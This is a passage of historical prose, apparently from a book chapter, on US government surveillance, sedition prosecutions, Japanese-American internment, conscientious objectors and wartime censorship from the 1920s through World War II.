Detractors on the other hand speculated that Hoover got the promotion because , in the words of intelligence expert William Corson , " there was enough in his files to effectively sink the Republican Party in the upcoming Presidential election . "
Whichever the case may be , recent documents secured by historians under the Freedom of Information Act reveal that Hoover secretly defied the Coolidge Directive against political surveillance and sporadically monitored such groups as the American Civil Liberties Union ( ACLU ) , even to the point of illegal break - ins .
Nonetheless , the Bureau 's low political profile coupled with its emphasis on catching criminals transformed its public image during the next decade .
An extremely significant but oft - neglected feature of President Franklin D. Roosevelt 's New Deal was a " war with the organized forces of crime , " involving a new deal for the Bureau .
Congress passed nine major anti-crime bills in 1934 .
These gave Bureau agents full arrest power and the authority to carry any kind of firearm , and they put a variety of crimes under its jurisdiction : robbing any bank insured by the Federal Deposit Insurance Corporation , fleeing across state lines to avoid prosecution or subpoena , extorting money by phone or mail , or transporting stolen property valued at $ 5000 or more across state lines .
Among these new laws was the National Rearms Act of 1934 , the first federal gun control law .
In his war on crime , as in most other respects , F.D.R. was fully anticipated by President Herbert Hoover .
Hoover had appointed the national Wickersham Commission to study the problems of law enforcement .
In his zest for increased bureaucratic efficiency in national crime control , he had created a separate Bureau of Prisons and a separate Bureau of Narcotics .
He also had signed the bill that established the Bureau of Investigation 's fingerprinting division in 1930 and the Lindbergh Bill , which made kidnapping a national crime , in 1932 .
Most important for the future of civil liberties , Hoover was the first U.S. President to request formally that the Bureau of Investigation collect political intelligence .
We have already observed that under J. Edgar Hoover , the Bureau continued throughout the twenties to monitor radical activities on its own .
But President Hoover legitimized these transgressions by requesting Bureau reports on groups as diverse as the Sentinels of the Republic ( a minor far right organization ) , the Navy League , the ACLU , the National Association for the Advancement of Colored People , and the Foreign Policy Association .
Roosevelt , upon assuming the Presidency , expanded the Bureau 's political surveillance .
While continuing Hoover 's precedent of soliciting PBI reports on his political adversaries , he secretly ordered the Bureau to look into the American Nazi movement in 1934 , and he widened that general mandate to include all potentially subversive groups in 1936 .
In June of 1939 , with concern about foreign spies and " fifth columnists " on the rise , Roosevelt centralized responsibility over all " espionage , counter - espionage , and sabotage matters " into the FBI 's hands , with Military Intelligence and Naval Intelligence playing supporting roles .
This directive became public and was broadened to include " subversive activities and violations of neutrality laws , " when the European war erupted later that year .
J. Edgar Hoover thereupon reactivated the dreaded General Intelligence Division and compiled a secret Custodial Detention list of persons to be jailed summarily during wartime .
FBI officials opened first - class mail and regularly practiced , with Roosevelt 's explicit blessing , wiretapping , despite the 1939 Supreme Court ruling that the Federal Communications Act of 1934 proscribed government wiretapping .
The executive branch instituted a loyalty program for federal job holders , with FBI checks , to help implement the Hatch Act , and the Attorney General drew up his first list of subversive organizations .
At the same time , Roosevelt prepared other sections of the executive branch for the suppression of dissent .
In the spring of 1940 he transferred the Immigration and Naturalization Service from the Labor to the Justice Department .
Roosevelt thought the Labor Department too lenient ; it was the Labor Department which in 1920 had initially called a halt to the Red Scare by refusing to deport the aliens that the Justice Department 's Bureau of Investigation had rounded up .
Also within the Justice Department , a newly established Neutrality Laws Unit ( which would become the Special War Policies Unit once the U.S. entered the war ) assumed responsibility for sedition prosecutions .
The Post Office invoked a strained interpretation of the Foreign Agents Registration Act to reinstitute its World War I practice of mail censorship .
It seized and destroyed over fifteen tons of alleged foreign propaganda mailed to the U.S. from Japan , Germany , Italy , and the Soviet Union .
The FBI invariably serviced White House requests for derogatory information on critics of Roosevelt 's foreign policy .
Roosevelt 's press secretary , in May of 1940 , turned over to J. Edgar Hoover for checking the names of persons who had sent telegrams critical of a Presidential fireside chat on national defense .
The FBI furnished the President with reports on leading isolationists , including Senators Nye and Wheeler .
After the America First Committee was organized , Roosevelt subjected it to the meticulous scrutiny of first the FBI and later the Internal Revenue Service .
In an ironic twist of fate , F.D.R. even ordered ex-President Hoover put under FBI observation .
The Dies Committee , while continuing to harass the Roosevelt administration , also started a probe of the America First Committee , one month before Pearl Harbor .
F.D.R. , however , fully reciprocated Dies 's enmity and ordered the FBI to investigate Dies and his supporters for election fraud and then , after Pearl Harbor , for fascist links .
J. Edgar Hoover skillfully played both political foes off against each other .
While investigating Dies for the President , he confidentially cooperated with the Dies Committee , feeding it FBI tips .
This tactic generally induced Roosevelt to give Hoover wider leeway , so that the FBI could preempt the exposes of the Dies Committee .
The hardest hit victims of this labyrinth of political ploys and government intrigue were not major political figures , but usually less influential and sometimes insignificant dissidents .
During the opening months of 1940 , the FBI conducted two sets of widely publicized raids .
The first picked up seventeen members of the Christian Front Sports Club in Brooklyn , New York -- young rightists , unemployed or very poor , who were supposedly plotting to overthrow the government .
The second , in Detroit , swooped down upon a dozen veterans of the Abraham Lincoln Brigade , all leftists who had fought against General Franco in the Spanish Civil War in 1936 and 1937 and were therefore charged with neutrality law infractions .
The trial of the Christian Fronters resulted in an acquittal after revelations that the defendants had received drunken encouragement from an FBI agent provocateur , while the Justice Department , facing a public outcry , dipped its three - year - late charges against the Abraham Lincoln Brigade veterans .
The Justice Department was successful , however , in convicting Earl Browder , the Communist Party 's General Secretary , of passport fraud in January , 1940 , after his testimony before the Dies Committee .
He received the ridiculously long and obviously political sentence of four years in prison and a $ 2000 fine .
( Another person convicted of the same offense shortly thereafter received merely a $ 500 fine . )
The government also initiated denaturalization proceedings against William Schneiderman , leader of the California Communist Party , and deportation proceedings against Harry Bridges , the left - wing leader of the west coast longshoremen .
A federal grand jury in October 1941 indicted pro-German publicist George Sylvester Viereck for infringement of the Foreign Agents Registration Act.
Viereck was on the German government 's payroll and was among the four hundred persons who had by March of 1940 dutifully registered under the act 's provisions .
But he was also involved in a Congressional scandal in which he had solicited isolationist writings for insertion by various legislators into the Congressional Record so that he could distribute them through mass mailings under Congressional franking privileges .
The State 's indictment charged him with not filling out his registration forms fully and properly .
His was only the most noteworthy of a whole slew of cases brought against both leftists and rightists under the same act .
/11
The first to fall prey to the Smith Act was the Socialist Workers Party .
The Socialist Workers Party was a Trotskyite splinter from the Communist Party .
It was also one of the few leftwing groups still opposed to U.S. involvement in the war after Hitler attacked the Soviet Union on June 22 , 1941 .
The Trotskyites committed the additional political sin of gaining control over Teamster locals in Minnesota and challenging the leadership of union president Dan Tobias , a Roosevelt ally .
Federal marshals raided the Minneapolis headquarters of the Socialist Workers Party on June 28 , 1941 , and indicted twenty - nine leaders .
Eighteen were convicted and jailed for from one to one and a half years .
The national government did devote some effort to the persecution of genuine spies .
Thus , the FBI cracked the two major German rings in 1941 and set in motion the process that would put their members behind bars .
It also began , under F.D.R.'s direct orders , secretly collaborating with British Intelligence , in violation of U.S. neutrality laws .
Although designed to keep the State out of war , neutrality laws ended up more often in practice being used by the State to harass private citizens .
/ 12
A most unusual prewar espionage case involved a code clerk at the U.S. Embassy in Great Britain : Tyler Kent .
Kent was presumably responsible for a leak of embassy communications to the Axis .
The U.S. government , in an unheard - of diplomatic irregularity , waived Kent 's diplomatic immunity so that the British could apprehend him .
It then pressured the British into trying Kent , rather than deporting him to the U.S.
An American trial would have disclosed the existence of the major documents that Kent had purloined -- the clandestine personal correspondence between President Roosevelt and Winston Churchill , carried on prior to Churchill 's becoming British Prime Minister , while he was still only a cabinet member in Chamberlain 's war government .
Such a patent exposure of F.D.R.'s unneutral designs would probably have outraged the American people and damaged F.D.R.'s bid for a third term in the 1940 Presidential race .
The British trial , on the other hand , was conducted behind closed doors , under harsher statutes .
Kent received a seven - year sentence , and the American public heard absolutely nothing about the case until four years later , long after the U.S. was fully committed to the war .
/l3
Finding a legal basis for suppressing the German - American Bund before Pearl Harbor proved more difficult for the U.S. government .
Back in 1933 , it had indicted Spanknoebel , then Bund leader , for violating an obscure notification clause in the Espionage Act .
But Spanknoebel fled to Germany , and after that , the Justice Department could find no grounds for further prosecution , despite all the new repressive laws .
Not until June of 1941 did Roosevelt order the seizure of Bund assets as part of his general order freezing all Axis assets in the United States .
Soon afterward , the government filed tax liens against the Bund .
The most telling blows against the Bund came from state and local governments .
New Jersey passed an anti-Bund law , forbidding the wearing of foreign uniforms , as early as mid-1938 , and several years later , confiscated the Bund 's Camp Nordland .
New York City 's mayor , Fiorello La Guardia , bent upon imprisoning Bund leaders under any pretext , established an antisubversive squad in the city 's police department and launched an investigation into Bund finances .
The young and aggressive New York District Attorney , Thomas Dewey , secured a conviction of Fritz Kuhn , head of the Bund , for misuse of Bund funds , and sent him to Sing Sing Prison for two and a half years in December , 1939 .
By the summer of 1941 , California had a comprehensive Subversive Organization Registration Law aimed at the Bund , while Florida had made membership in any " anarchistic , communistic , Naziistic or fascistic organization " a felony .
The Bund was not the only fringe organization to feel the sting of state and local repression .
Pelley of the Silver Shirts , to give just one more example from the right , was constantly in trouble with North Carolina authorities from 1935 on .
Several states made libel of racial , religious , and ethnic groups a criminal offense .
To drive the Communist Party off the ballot , many states made their ballot requirements more stringent during the 1940 election or immediately thereafter .
Four states , at the instigation of the Dies Committee , indicted over a hundred Communist petition circulators for election fraud .
Oklahoma handed down sentences of ten years to four Communist leaders under the state 's criminal syndicalism laws , while the Washington legislature refused to seat an elected state senator who was a former party member .
But it was neither fascists nor Communists who suffered most during the pre-Pearl Harbor hysteria .
According to the ACLU 's annual report for 1940 - 41 , " the most numberous attacks on civil liberties of any single minority were directed against the Jehovah 's Witnesses . "
/ 14 The Jehovah 's Witnesses are a millenialist Protestant sect , founded in the last third of the nineteenth century and numbering a quarter of a million American adherents .
Their theology is extremely anti-Statist , and it even opposes flag salutes .
This opposition so enraged local authorities , the American Legion , and other protectors of patriotism that the Witnesses were the only group during the World War II period to endure the kind of vigilante violence that had been so prevalent during World War I .
Mob attacks upon Witnesses occurred in 335 communities in 44 different states in the six months running from May to October 1940 alone .
Many of the injured were women and children .
The Supreme Court defended the Witnesses ' First Amendment right to distribute religious literature without restrictions from local ordinances beginning in 1938 .
But in the 1940 Gobitis case , the Court held that children could legally be expelled from government schools for not saluting the flag .
" National Unity is the basis of national security , " wrote Justice Felix Frankfurter in the majority opinion .
/15 Massive expulsions were the result , followed sometimes by state prosecutions of Witness parents for violating compulsory attendance laws .
A few attempts were made to take children from their Jehovah 's Witness parents but were unsuccessful .
Indiana , under its state sedition law , sentenced two elderly Witness women who refused to salute the flag to prison terms of two to ten years , although their convictions were later overturned on appeal .
II .
Post - Pearl Harbor
All the aforementioned events , entailing enormous gains for State power , occurred , we should stress , at a time when the United States was technically at peace .
The Japanese attack on Pearl Harbor merely accelerated the civil liberties trends already in motion .
The awesome repressive machinery constructed by Congress and the President during the prewar period now became fully operational .
The only well - known World War II civil liberties outrage is the internment of Japanese - Americans .
Actually , the U.S. government amplified its harassment of aliens from all enemy nations at the first news of the Japanese attack .
Within seventy - two hours of the attack , the FBI had 3,846 Japanese , German , and Italian immigrants in custody .
A grand total of sixteen thousand were seized throughout the war and about four thousand of them were held for the duration .
This was done under authority of the old Alien Enemies Act , which permitted alien internment during wartime .
It was one of the four notorious Alien and Sedition Acts passed by the Federalists in 1798 , and the only one of the four that President Jefferson had left on the books .
/16
The " enemy " aliens who were parched or who remained at large suffered numerous other infringements of their liberty .
The national government forced more than ten thousand to leave their homes near defense installations , and it imposed rigid curfews upon others .
They all needed permission to travel or move and could not possess firearms or short - wave radios .
The Justice Department 's only leniencies were to exempt Italian aliens from these restrictions after Columbus Day , 1942 , and west coast Germans two months later .
Unlike the policies already mentioned , the State 's treatment of the west coast Japanese made no distinction between native - born citizens ( Nisei ) and foreign - born aliens ( Issei ) .
/17 ( None of the foreign - born Japanese were naturalized American citizens because they were legally ineligible . )
As U.S. defeats in the Pacific mounted during the war 's early days , west coast leaders intensified their demands that all Japanese be singled out for special treatment .
These demands arose out of the area 's deep - rooted racism , as well as from resentment at economic competition with this industrious minority .
Many people were more than anxious to accept columnist Walter Lippmann 's strained explanation for the complete absence of any act of sabotage by Japanese - Americans .
According to Lippmann , this merely indicated that they were waiting with Oriental patience for the propitious moment to commit some massive coordinated atrocity .
/18
Roosevelt signed Executive Order 9066 on February 19 , 1942 , empowering the army to exclude " any or all persons " from designated military zones .
One month later , he signed a Congressional measure stipulating criminal penalties for disobeying this order .
The War Department had already declared the western parts of California , Oregon , and Washington and the southern part of Arizona a " prohibited zone . "
No one was ordered to leave yet , but about nine thousand Japanese - Americans saw the handwriting on the wall and decided to move inland on their own .
They encountered a very chilly reception .
Officials from other western states objected to being made , in the words of the Governor of Arizona , " a dumping ground for enemy aliens , " and violence threatened .
/19
The Army therefore forbade any more voluntary evacuation .
Instead , it forcibly collected at race tracks , fairgrounds , and other makeshift assembly points all persons of Japanese ancestry residing not only within the original restricted zone but anywhere within California , Washington , Oregon , southern Arizona , and Alaska .
Evacuees could only take clothing , bedding and utensils .
The government offered to store their remaining personal property , but would assume no liability for it .
So most evacuees sold their property on five - days ' notice for what they could get .
After they left , their leases expired and their farms were generally confiscated .
Japanese - Americans suffered an estimated $ 350 million loss in property and income . / 20
The War Relocation Agency ( WRA ) , a civilian agency created in mid-March , erected ten semi-permanent relocation centers in inhospitable regions of seven western states .
By September , the army had turned over 110,000 Japanese - Americans to these camps .
Nearly two - thirds of that total were native - born American citizens .
Anyone with simply one Japanese great grandparent qualified for internment , although this rule was later relaxed .
The relocation centers were , as F.D.R. admitted in a slip of the tongue , " concentration camps , " /21 ringed with barbed wire and armed guards .
In at least one instance , a sentry shot and killed an elderly internee who wandered too close to the outer fence , in violation of camp regulations .
The WRA began granting leaves to those inmates who could prove that they were not disloyal , that they had a job waiting , and that the community would accept them .
But only 35,000 , mostly young Nisei , left the camps under this dispensation .
Meanwhile , the War Department sought to register male internees for the drafts following Secretary of War Henry L. Stimson 's announcement of the " inherent right of every faithful citizen regardless of ancestry , to bear arms in the nation 's battle . "
/ 22
Of the 75,000 who were asked whether they would renounce allegiance to the Japanese emperor , however , 8,700 either refused or equivocated .
Many of these were Issei who , being forbidden American citizenship , were afraid to put themselves in limbo , without any formal nationality .
Riots also erupted in some of the camps .
The worst took place at Camp Manzanar in California , where soldiers fired into unarmed crowds , killing two and wounding ten .
Congressional critics thought the WRA was too lenient , and forced the agency , beginning in the summer of 1943 , to isolate those inmates who would not swear loyalty or who were troublemakers .
The WRA consequently transferred about 18,500 to a special camp in Tule Lake , California .
The Tule Lake inmates organized a campaign of passive resistance which turned into rioting , with the result that the government put the camp under military rule for two months and put two hundred internees in the stockade .
After Congress passed the Denationalization
Act of 1944 , making it easier for Americans to renounce their citizenship , some eight thousand Japanese - Americans were eventually returned to Japan . / 23
The Roosevelt Administration conceded that , whatever the military justification for evacuation , it no longer applied in the spring of 1944 .
Roosevelt , however , continued Japanese internment to avoid any political repercussions from west coast voters .
Only after he was safely reelected to a fourth term that November did he permit the inmates to leave the camps and return home .
Some , their lives disrupted and fearing racist attacks , were reluctant to leave the camps .
But the WRA all of a sudden became concerned about the $ 250 million that the camps had already cost taxpayers , and it booted out the last of the internees at the end of 1945 .
The U.S. State extended its deprivations against people of Japanese ancestry beyond the borders .
It pressured more than a dozen Latin American nations to implement similar policies and even interned two thousand of their Japanese residents right here in U.S. relocation centers .
/ 24 Curiously , the Japanese in Hawaii , who numbered 250,000 , one - third of the islands ' population , were untouched by the internment program , except for about two thousand who were shipped to the mainland .
Extensive internment would have disrupted Hawaii 's economy .
The government did , however , put Hawaii under strict martial law for the three years following the Japanese attack on Pearl Harbor , suspending trial by jury , habeas corpus , and other procedural safeguards .
Out of the over 22,000 military trials of civilians on the islands during 1942 , 99 percent resulted in convictions .
/ 25
Internment was not the only consequence of F.D.R.'s Executive Order 9066 , nor Japanese the only class of U.S. citizens affected .
The vague phrasing of the order would have permitted the army to evacuate or incarcerate any American anywhere in the country , had it so chosen .
Thus , even after the Japanese were free to leave the relocation centers , five thousand still faced individual exclusion from the west coast .
The military also forcibly ejected , after secret deliberations , 250 citizens not of Japanese ancestry from the west coast , and an additional fifty from the east coast .
/ 26
Most historical accounts of the World War II homefront report that , except for Japanese - American internment , the U.S. civil liberties record was relatively clean .
It never approached , this view argues , the repressive heights of World War I .
The first observation we can make about this view is that Japanese - American internment is a pretty glaring exception .
Even one of the early defenders of the Second World War civil liberties record , legal scholar Edward S. Corwin , has rated the treatment of the Japanese as " the most drastic invasion of the rights of citizens of the United States by their own government that has thus far occurred in the history of our nation . "
/ 27 During the First World War , the total number of victims of the Espionage and Sedition Acts , of alien internment and deportation , of state prosecutions , and of mob violence could not have exceeded fifteen thousand .
Contrast that figure with 110,000 interned Japanese - Americans .
Then there is the internment and imprisonment of conscientious objectors during the Second World War .
True , the options available to conscientious objectors were slightly improved over the First World War .
About 25,000 accepted noncombatant military duty .
Another 11,950 worked in civilian public service camps at tasks mainly involving conservation , forestry , and public health .
The pacifist churches and organizations agreed to fund these camps , at an eventual cost of over $ 7 million .
But rigid military discipline prevailed , making the camps nothing more than outdoor prisons .
The objectors in the camps received no pay for fifty hours per week of generally arduous and sometimes dangerous work .
In the rare case where an objector was allowed to work outside the camps , the State confiscated his wages .
About five hundred objectors volunteered for medical experiments in which they were infected with lice , bitten by mosquitoes to test typhus and malaria cures , or subjected to other potentially disabling or fatal procedures .
Not until two years after the war ended did the government release the last of the objectors from these camps .
Then , to add insult to injury , several states barred objectors from licensed professions , and the Supreme Court upheld these bars .
Whether one received conscientious objector status at all depended upon the vagaries of local boards .
In any case , only religious objectors qualified under the Selective Service Act , and Selective Service Director General Louis B. Hershey ordered this provision interpreted strictly .
Of the sixteen thousand men convicted for draft resistance of one kind or another during the war , six thousand were conscientious objectors whose status was not recognized , and three quarters of those were Jehovah 's Witnesses .
Although opposed to the war on religious grounds , the Witnesses were not consistent pacifists -- they declared their willingness to fight in the battle of Armageddon -- and draft boards routinely denied their requests for ministerial exemptions .
The Selective Service
Act provided a maximum prison term of five years .
This applied not only for refusal to serve but also for failure to register , which in World War I had been just a misdemeanor .
In a few cases , objectors faced the World War I procedure of being forcibly inducted and then court - martialed , with much sterner penalties .
The most severe case was that of Henry Weber , a conscientious objector who was married and the father of three children .
He also belonged to the Socialist Labor Party , another Marxist splinter group .
The army initially sentenced him to hang , then reconsidered , and changed that to life imprisonment .
Only as the war drew to a close , after several appeals , was his sentence reduced to five years and a dishonorable discharge .
Overall , the jailings of conscientious objectors during World War II , not counting those interned in civilian public service camps , ran at three times the World War I rate , even in proportion to the total drafted .
/28
If we somehow overlook Japanese - Americans and conscientious objectors , we still must appraise the State 's respect for personal liberty during World War II in light of the virtual nonexistence of antiwar sentiment .
After Pearl Harbor , Americans endorsed U.S. intervention with an eruption of patriotic unity unmatched in any previous war .
The prewar isolationists universally abandoned their cause , closed up shop , and threw their hearts into the war .
The country 's organized peace movement disintegrated .
/ 29
And on the extreme left , the Communist Party tried to outdo all others in its new - found American nationalism .
In contrast , two powerful leftwing organizations , the Socialist Party and the Industrial Workers of the World , had opposed World War I .
Despite the Second World War 's unprecedented popularity , the national government still went out of its way to conduct sedition trials , initiate denaturalizations and deportations , and practice censorship .
Sometimes , as the case of the Japanese - Americans amply illustrates , it created disloyalty out of thin air , where none initially existed .
In other instances , it would prosecute the same individuals in several different proceedings under several different laws , because of the paucity of eligible scapegoats .
Relative to the amount of dissent , there was clearly more repression during the Second World War then during the First .
But since many of the victims were viewed as pathetic rightists with odious ideas , America 's dominant liberals hardly noticed .
Repression of groups other than the Japanese - Americans during World War II required no new legislation .
The prewar period provided all the necessary tools .
A mass prosecution conducted under the Smith Act was to be the Roosevelt Administration 's show trial .
Attorney General Francis Biddle , facing constant prodding from F.D.R. , indicted a heterogenous assortment of two dozen alleged native fascists in July , 1942 .
The faulty indictment had to be rewritten twice , however , so that the actual trial did not begin for almost another two years .
The defendants , dragged from all corners of the country to stand trial in Washington , D.C. , now numbered thirty .
Most of them had never met each other .
They were not even all overtly anti-Jewish ; all they had in common was a hatred of President Roosevelt .
/30
The most prominent defendant was Harvard - educated Laurence Dennis , a former diplomat and author of The Coming American Fascism .
Dennis 's book was more prediction than prescription , and when told of his indictment , he exclaimed , " My prophecy is coming true .
This is fascism . "
/31 Viereck , the German publicist indicted before Pearl Harbor under the Foreign Agents Registration Act , was also among the defendants , and while he stood trial , his son died in action with U.S. forces in North Africa .
Other defendants included Elizabeth Dilling , author of The Red Network , a book that charged many liberals with being Communists ; Pelley of the Silver Shirts ; and four leaders of the German - American Bund .
The government 's indictment charged the defendants with participating in a fantastic international Nazi conspiracy , dating from 1933 , to establish a fascist regime in the U.S. by subverting morale in the armed forces .
The defendants had purportedly assert - ed , among other scurrilous and dangerous doctrines , that " President Roosevelt is reprehensible , a war - monger , liar , unscrupulous , and a pawn of the Jews , Communists and Plutocrats " and that " [ t ] he Japanese attack on Pearl Harbor was deliberately invited by the public officials of the United States , in order to involve the United States in a foreign war . "
The indictment named as co-conspirators forty - two books and publications and thirty - five organizations , including the German - American Bund , the Silver Shirts , the German Embassy in the U.S. , and the National Socialist Party of Germany .
The first indictment had even named the America First Committee , but that organization did not appear in the final document .
The defendants engaged twenty - two different lawyers , two - thirds of whom were court appointed to represent the indigent .
The trial quickly degenerated into a circus .
The defendants and their lawyers bickered among themselves , separately raised every conceivable objection , and regularly disrupted the proceedings .
One lawyer concluded most of his objections with the exclamation " Your Honor , this is just another New Deal trick ! " which invariably brought snickers from the jury .
The presiding judge , in his efforts to maintain order , issued so many contempt citations that the cited lawyers and defendants formed a " contempt club , " with badges .
Some of the defendants wore masks to court and signs saying , " I am a Spy , " until dissuaded by their lawyers .
The judge finally kicked one lawyer off the case , while another resigned .
The number of defendants fell by four , with one dying , two being severed from the case for illness , and one for unruly behavior .
After an eight - month marathon , and a trial record of 18,000 pages , the presiding judge died , and a mistrial was declared .
The prosecution had still presented less than half its case , which failed to charge any overt acts , but relied solely on guilt by association and similarities between the defendants ' prewar opinions and the Nazi " party line . "
The poorer defendants , having to either raise bail and support themselves in wartime Washington or remain in jail during the trial , suffered extreme hardships .
The Justice Department pressed for a new trial for the next two years , until November of 1946 , after the war was long over , when the courts at last dismissed the case , ruling that a retrial would be " a travesty of justice . "
Nevertheless , as Biddle coyly admits in his memoirs , " the propaganda had long since ceased . "
" In that sense , at least , the prosecution had accomplished the purpose the President had in mind . " / 32
At the time that the mass sedition trial commenced , two of the defendants were already incarcerated without trial as dangerous enemy aliens , three more had suffered involuntary psychiatric commitment , and six were serving sentences arising out of other war - related prosecutions .
Among the latter group were Viereck and Pelley .
Viereck 's indictment under the Foreign Agents Registration
Act had resulted in a conviction , encouraging the government to use the act with telling effect upon several others who had been on the fringes of the isolationist movement .
Pelley , in one of the first post - Pearl Harbor cases , had received a fifteen - year sentence , while his press was fined $ 5000 , for articles critical of the U.S. war effort
The national government had tried him under the sedition provisions of the Espionage Act , which had become operative with the declaration of war .
All of this was on top of having his parole revoked in North Carolina .
Two other defendants in the mass sedition trial were leaders of the Friends of Progress , a group which had conducted a mock impeachment of Roosevelt and then found themselves facing no fewer than four wartime prosecutions .
In addition to being entangled in the mass sedition trial , they had been convicted under both the national Espionage Act and California 's Subversive Organization Registration Law ( the state conviction was overturned on appeal ) and charged with criminal libel in California for critical remarks about General Douglas MacArthur .
In a second mass trial , this one using the Selective Service Act , the Justice Department charged twenty - four members of the German - American Bund with counseling draft evasion .
The two mass trials had much in common , including several of the defendants and many of the prosecution witnesses .
The major difference was that the mass trial of the German - Americans resulted in a conviction . / 33
In all , more than two hundred different persons went through such sedition prosecutions under either the Espionage Act , the Foreign Agents Registration Act , the Smith Act , or the Selective Service Act during the course of the war .
The largest number of them were , interestingly enough , blacks .
The FBI arrested about one hundred Black Muslims and members of other more ephemeral black religious cults that identified with the Japanese as kindred victims of white oppression .
Robert Jackson , for example , the founder of the Ethiopian Pacific League , who had told a Harlem audience that the Japanese " wanted to help you and give you back your culture , " received ten years ' imprisonment and a $ 10,000 fine . / 34
After blacks , the German - American Bund provided the next largest number of sedition defendants .
In addition , Biddle launched a crusade to revoke the citizenship of Bund members .
This crusade had denaturalized forty - two by December 1940 , three hundred suits were pending , and thousands of cases were under investigation .
The courts , however , restrained the Justice Department , so that ultimately a total of only 180 Americans lost their citizenship .
Among them was Fritz Kuhn , the Bund leader jailed in New York before the war .
His tale demonstrates the vindictive lengths to which the State carried its persecution of the Bund .
Stripped of his citizenship , Kuhn was no sooner paroled by New York than he was put in a federal internment camp for enemy aliens .
The U.S. deported him to Germany at the war 's close , where the U.S. occupation government promptly arrested him again and finally sentenced him to ten years hard labor for associations with Hitler which Kuhn had , in fact , fabricated in order to increase his stature within the Bund .
Kuhn was finally freed on appeal in 1950 , and a year later , he died .
One clear difference between repression in the two world wars was the greater degree of centralization during the Second .
The Roosevelt Administration , in conferences with state officials both before and after U.S. entry , reached an unpublicized gentleman 's agreement that left state sedition laws nearly unenforced .
Biddle , unlike Wilson 's Attorney General during World War I , kept a tight reign on U.S. attorneys , who could not undertake sedition prosecutions without his approval .
The national government also discouraged vigilantes and refused to revive any private loyalty organizations like the American Protective League .
Private violence and local repression did transpire , however .
As in the prewar period , the Jehovah 's Witnesses were the most frequent objects of mob attacks , being the only war opponents with any visibility .
Mississippi arrested over fifty Witnesses for violating its new sedition law .
Brutality against Witnesses did not recede until mid-1942 , when the Justice Department 's Civil Rights Division began to come to their aid .
In one case , it secured a conviction of two West Virginia police officers for releasing several Witnesses into the eager hands of American Legionnaires , who had then forced the Witnesses to drink castor oil , tied them together with police department rope , and marched them out of town .
The Supreme Court also succored the Witnesses .
Although it upheld local peddlers ' taxes , no matter how exorbitant , on the distribution of their literature , it overturned their Mississippi conviction and , in June 1943 , reversed its previous mandatory flag - salute decision .
The Second World War also saw another upsurge in violence directed at racial minorities .
The war boom and the market demand for labor , far more than the government 's Fair Employment Practices Committee , opened up new economic opportunities for minorities .
As blacks poured into industrial centers , north and south , racial antagonism intensified .
Disorders first appeared on southern military posts , where white residents clashed with northern black soldiers , who did not proffer the customary subservience .
But the most severe race riots occurred in the cities : Harlem ; Philadelphia ; Mobile , Alabama ; El Paso and Port Arthur , Texas ; Springfield , Massachusetts ; Hubbard , Ohio .
A two - day guerrilla war between blacks and whites in Detroit during the summer of 1943 left twenty - five blacks and nine whites dead , seven hundred of both races injured , and $ 2 million property damage .
/ 35
The riot only ceased when six thousand troops occupied the city .
Two weeks later , during the famous zoot - suit riots in Los Angeles , white servicemen terrorized the city 's Mexican - American sections for four days as the city police , the Military Police , and the Shore Patrol all looked the other way .
/ 36
The only factor which kept violence against Japanese - Americans at such a low ebb was their forcible removal .
As in World War I , the national government had an official propaganda agency .
Roosevelt created the Office of Facts and Figures before Pearl Harbor and then replaced it in mid-1942 with the Office of War Information ( OWI ) , under Elmer Davis from the New York Times .
The OWI 's first - year appropriation was nearly $ 40 million , but , from the outset , it had to be more circumspect than its World War I counterpart , the Committee on Public Information .
It was continuously beset with controversy , emanating both from within the agency and from Congressional critics .
Congress cut off practically all funding for the OWI 's domestic operations in 1943 , but expanded its overseas activities .
/ 37
More robust was the Office of Censorship , created by the First War Powers Act .
It examined all forms of communication entering or leaving the country -- letters , cables , telephone calls , even films .
It went so far as to suppress private letters that painted a gloomy picture of the war .
By 1944 , it had detained 500,000 pieces of mail , occupying 10,000 square feet of storage space .
The Office also drew up an ostensibly voluntary Code of Wartime Practices that applied to press and radio news reporting .
/ 38
The military engaged in its own independent censorship covering the news it released , the mail sent and received by U.S. troops , the dispatches of war correspondents , and all media within conquered territories .
When the isolationist Chicago Tribune innocently published too many details about the Battle of Midway , the Justice Department tried to prosecute .
The grand jury refused to indict , however .
The Post Office banned single issues of domestic publications it judged subversive and then used that as justification for revoking their second - class mailing privileges altogether just as freely as it had in the first World War .
This affected over seventy publications , ranging from the Trotskyite Militant to the Christian Pacifist Boise Valley Herald .
The most important publication denied use of the mails was Father James Coughlin 's Social Justice , with 200,000 subscribers .
Father Coughlin was a radio priest from Michigan and probably the most influential native radical rightist .
Biddle was afraid that a sedition trial would make Coughlin a martyr , so he persuaded the Catholic hierarchy to silence Coughlin instead .
Social Justice , meanwhile , ceased publication in the face of the postal ban .
/ 39 The Post Office also took advantage of the war to mount a fresh assault on obscenity .
It barred about sixty additional publications from the mails for this reason , including Esquire magazine .
The government did not rely solely upon postal censorship , as in the previous war , to intimidate the domestic press .
It confiscated outright publications put out by American citizens if it could even tenuously argue that they were financed by enemy funds .
This is what befell all publications of the German - American Bund , as well as a few domestic Japanese newspapers .
The Enemy Alien Property Division of the Treasury Department handled these seizures as part of its general takeover of enemy property .
Prosecutions for actual spying and treason , as opposed to sedition , made their first widespread appearance in this country during the Second World War .
The national government convicted ninety - one persons of these offenses between 1938 and 1945 , sixty - four of them U.S. citizens .
Many of the sentences were blatantly excessive .
For instance , one of the earliest espionage prosecutions subsequent to Pearl Harbor ensnared one Max Stephen , an inconsequential Detroit tavern keeper who gave sanctuary to a German prisoner - of - war escaped from Canada .
The State dusted off its until - then rarely used treason statute and sentenced Stephen to hang .
Roosevelt commuted the sentence to life imprisonment .
The State dealt even more summarily with eight German saboteurs dropped off on U.S. shores by submarines in the summer of 1942 .
The Coast Guard and FBI quickly apprehended all eight .
Since they had not yet committed sabotage , and since attempted sabotage was a minor felony , difficult to prove , the Roosevelt Administration decided against a civilian trial .
In flagrant disregard of the Supreme Court 's Ex Parte Milligan Civil War precedent , a military commission , even less bound by judicial safeguards than a court martial , tried the saboteurs in secret .
Six were electrocuted within a month and a half of their apprehension , while the two who turned State 's evidence received long sentences . / 40
In 1943 , the U.S. secured treason indictments against eleven Americans making broadcasts from German , Italian , or Japanese radio stations .
At the end of the war , when the government finally caught up with these renegade broadcasters , it convicted five .
Probably the most egregious among these cases was that of Iva Ikuko Toguri d'Aquino .
She was a native - born American of Japanese ancestry caught in Japan at the time of the Pearl Harbor attack .
She went to work for Radio Tokyo under duress , was only one of several women broadcasters known by the generic name " Tokyo Rose , " and made mostly routine broadcasts devoid of political or military overtones .
But she had the misfortune to be tried in California before an all - white jury , and was sentenced to 10 years and $ 10,000 .
